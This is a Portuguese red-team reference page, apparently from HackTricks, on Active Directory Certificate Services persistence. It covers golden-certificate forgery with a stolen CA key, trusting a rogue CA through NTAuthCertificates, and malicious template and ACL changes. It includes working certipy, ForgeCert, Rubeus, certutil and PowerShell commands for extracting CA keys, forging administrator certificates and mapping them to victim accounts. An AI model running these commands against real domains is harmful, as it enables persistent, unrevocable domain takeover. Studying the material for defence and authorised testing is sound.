# Persistência de Domínio AD CS

{{#include ../../../banners/hacktricks-training.md}}

**Isto é um resumo das técnicas de persistência de domínio compartilhadas em [https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf](https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf)**. Consulte-o para mais detalhes.

## Forjar Certificados com Certificados CA Roubados (Golden Certificate) - DPERSIST1

Como você pode dizer que um certificado é um certificado CA?

Pode-se determinar que um certificado é um certificado CA se várias condições forem atendidas:

- O certificado está armazenado no servidor CA, com sua chave privada protegida pelo DPAPI da máquina, ou por hardware como um TPM/HSM se o sistema operacional oferecer suporte.
- Os campos Issuer e Subject do certificado correspondem ao distinguished name da CA.
- Uma extensão "CA Version" está presente exclusivamente nos certificados CA.
- O certificado não possui campos Extended Key Usage (EKU).

Para extrair a chave privada deste certificado, a ferramenta certsrv.msc no servidor CA é o método suportado via GUI integrada. No entanto, este certificado não difere dos outros armazenados no sistema; portanto, métodos como [THEFT2 technique](certificate-theft.md#user-certificate-theft-via-dpapi-theft2) podem ser aplicados para extração.

O certificado e a chave privada também podem ser obtidos usando o Certipy com o seguinte comando:
```bash
certipy ca 'corp.local/administrator@ca.corp.local' -hashes :123123.. -backup
```
Ao adquirir o certificado CA e sua chave privada no formato `.pfx`, ferramentas como [ForgeCert](https://github.com/GhostPack/ForgeCert) podem ser utilizadas para gerar certificados válidos:
```bash
# Generating a new certificate with ForgeCert
ForgeCert.exe --CaCertPath ca.pfx --CaCertPassword Password123! --Subject "CN=User" --SubjectAltName localadmin@theshire.local --NewCertPath localadmin.pfx --NewCertPassword Password123!

# Generating a new certificate with certipy
certipy forge -ca-pfx CORP-DC-CA.pfx -upn administrator@corp.local -subject 'CN=Administrator,CN=Users,DC=CORP,DC=LOCAL'

# Authenticating using the new certificate with Rubeus
Rubeus.exe asktgt /user:localdomain /certificate:C:\ForgeCert\localadmin.pfx /password:Password123!

# Authenticating using the new certificate with certipy
certipy auth -pfx administrator_forged.pfx -dc-ip 172.16.126.128
```
> [!WARNING]
> O usuário alvo para falsificação de certificado deve estar ativo e ser capaz de se autenticar no Active Directory para que o processo tenha sucesso. Forjar um certificado para contas especiais como krbtgt é ineficaz.

Este certificado forjado será **válido** até a data de término especificada e **enquanto o certificado raiz da CA estiver válido** (normalmente de 5 a **10+ anos**). Ele também é válido para **máquinas**, então combinado com **S4U2Self**, um atacante pode **manter persistência em qualquer máquina do domínio** enquanto o certificado da CA for válido.\  
Além disso, os **certificados gerados** com este método **não podem ser revogados**, pois a CA não tem conhecimento deles.

### Operando sob Strong Certificate Mapping Enforcement (2025+)

Desde 11 de fevereiro de 2025 (após o rollout do KB5014754), os controladores de domínio passam a usar por padrão **Full Enforcement** para mapeamentos de certificado. Na prática isso significa que seus certificados forjados devem ou:

- Conter um vínculo forte com a conta alvo (por exemplo, a extensão de segurança SID), ou
- Estar emparelhados com um mapeamento explícito e forte no atributo `altSecurityIdentities` do objeto alvo.

Uma abordagem confiável para persistência é emitir um certificado forjado encadeado à Enterprise CA roubada e então adicionar um mapeamento explícito e forte ao principal da vítima:
```powershell
# Example: map a forged cert to a target account using Issuer+Serial (strong mapping)
$Issuer  = 'DC=corp,DC=local,CN=CORP-DC-CA'           # reverse DN format expected by AD
$SerialR = '1200000000AC11000000002B'                  # serial in reversed byte order
$Map     = "X509:<I>$Issuer<SR>$SerialR"             # strong mapping format
Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
```
Notas
- Se você puder criar certificados forjados que incluam a extensão de segurança SID, estes serão mapeados implicitamente mesmo sob Full Enforcement. Caso contrário, prefira mapeamentos explícitos e fortes. Veja [account-persistence](account-persistence.md) para mais sobre mapeamentos explícitos.
- Revogação não ajuda os defensores aqui: certificados forjados são desconhecidos do banco de dados da CA e, portanto, não podem ser revogados.

## Trusting Rogue CA Certificates - DPERSIST2

O objeto `NTAuthCertificates` é definido para conter um ou mais **CA certificates** dentro do seu atributo `cacertificate`, que o Active Directory (AD) utiliza. O processo de verificação pelo **controlador de domínio** envolve checar o objeto `NTAuthCertificates` em busca de uma entrada que corresponda à **CA specified** no campo Issuer do **certificate** que está autenticando. A autenticação prossegue se for encontrada uma correspondência.

Um certificado CA autoassinado pode ser adicionado ao objeto `NTAuthCertificates` por um atacante, desde que ele tenha controle sobre esse objeto do AD. Normalmente, apenas membros do grupo **Enterprise Admin**, juntamente com **Domain Admins** ou **Administrators** no **forest root’s domain**, têm permissão para modificar esse objeto. Eles podem editar o objeto `NTAuthCertificates` usando `certutil.exe` com o comando `certutil.exe -dspublish -f C:\Temp\CERT.crt NTAuthCA`, ou empregando a [**PKI Health Tool**](https://docs.microsoft.com/en-us/troubleshoot/windows-server/windows-security/import-third-party-ca-to-enterprise-ntauth-store#method-1---import-a-certificate-by-using-the-pki-health-tool).

Comandos adicionais úteis para esta técnica:
```bash
# Add/remove and inspect the Enterprise NTAuth store
certutil -enterprise -f -AddStore NTAuth C:\Temp\CERT.crt
certutil -enterprise -viewstore NTAuth
certutil -enterprise -delstore NTAuth <Thumbprint>

# (Optional) publish into AD CA containers to improve chain building across the forest
certutil -dspublish -f C:\Temp\CERT.crt RootCA          # CN=Certification Authorities
certutil -dspublish -f C:\Temp\CERT.crt CA               # CN=AIA
```
Essa capacidade é especialmente relevante quando usada em conjunto com um método descrito anteriormente envolvendo ForgeCert para gerar certificados dinamicamente.

> Considerações de mapeamento pós-2025: colocar uma CA rogue em NTAuth apenas estabelece confiança na CA emissora. Para usar certificados leaf para logon quando os DCs estiverem em **Full Enforcement**, o certificado leaf deve ou conter a extensão de segurança SID ou deve haver um mapeamento explícito forte no objeto alvo (por exemplo, Issuer+Serial em `altSecurityIdentities`). Veja {{#ref}}account-persistence.md{{#endref}}.

## Configuração Maliciosa - DPERSIST3

Há muitas oportunidades para **persistence** através de **modificações de security descriptor dos componentes do AD CS**. Modificações descritas na seção "[Domain Escalation](domain-escalation.md)" podem ser implementadas maliciosamente por um atacante com acesso elevado. Isso inclui a adição de "control rights" (por exemplo, WriteOwner/WriteDACL/etc.) a componentes sensíveis como:

- O objeto **AD computer** do servidor CA
- O **RPC/DCOM server** do servidor CA
- Qualquer **descendant AD object or container** em **`CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>`** (por exemplo, o container Certificate Templates, o container Certification Authorities, o objeto NTAuthCertificates, etc.)
- Grupos AD com direitos delegados para controlar AD CS por padrão ou pela organização (como o grupo incorporado Cert Publishers e qualquer um de seus membros)

Um exemplo de implementação maliciosa envolveria um atacante, que tem **elevated permissions** no domínio, adicionando a permissão **`WriteOwner`** ao template de certificado padrão **`User`**, com o atacante sendo o principal para esse direito. Para explorar isso, o atacante primeiro mudaria a propriedade do template **`User`** para si. Em seguida, o **`mspki-certificate-name-flag`** seria definido como **1** no template para habilitar **`ENROLLEE_SUPPLIES_SUBJECT`**, permitindo que um usuário forneça um Subject Alternative Name na requisição. Posteriormente, o atacante poderia **enroll** usando o **template**, escolhendo um nome de **domain administrator** como nome alternativo, e utilizar o certificado obtido para autenticar-se como DA.

Ajustes práticos que atacantes podem configurar para persistência de longo prazo no domínio (veja {{#ref}}domain-escalation.md{{#endref}} para detalhes completos e detecção):

- Flags de política da CA que permitem SAN dos requisitantes (por exemplo, habilitar `EDITF_ATTRIBUTESUBJECTALTNAME2`). Isso mantém caminhos semelhantes ao ESC1 exploráveis.
- DACL do template ou configurações que permitem emissão com capacidade de autenticação (por exemplo, adicionar EKU Client Authentication, habilitar `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`).
- Controlar o objeto `NTAuthCertificates` ou os containers da CA para reintroduzir continuamente emissores rogue caso os defensores tentem limpeza.

> [!TIP]
> Em ambientes reforçados após KB5014754, combinar essas misconfigurações com mapeamentos explícitos fortes (`altSecurityIdentities`) garante que seus certificados emitidos ou forjados permaneçam utilizáveis mesmo quando os DCs aplicarem strong mapping.



## Referências

- Microsoft KB5014754 – Alterações na autenticação baseada em certificado em controladores de domínio Windows (cronograma de aplicação e strong mappings). https://support.microsoft.com/en-au/topic/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers-ad2c23b0-15d8-4340-a468-4d4f3b188f16
- Certipy – Referência de comandos e uso de forge/auth. https://github.com/ly4k/Certipy/wiki/08-%E2%80%90-Command-Reference
- [0xdf – HTB: Certificate (SeManageVolumePrivilege to exfil CA keys → Golden Certificate)](https://0xdf.gitlab.io/2025/10/04/htb-certificate.html)

{{#include ../../../banners/hacktricks-training.md}}
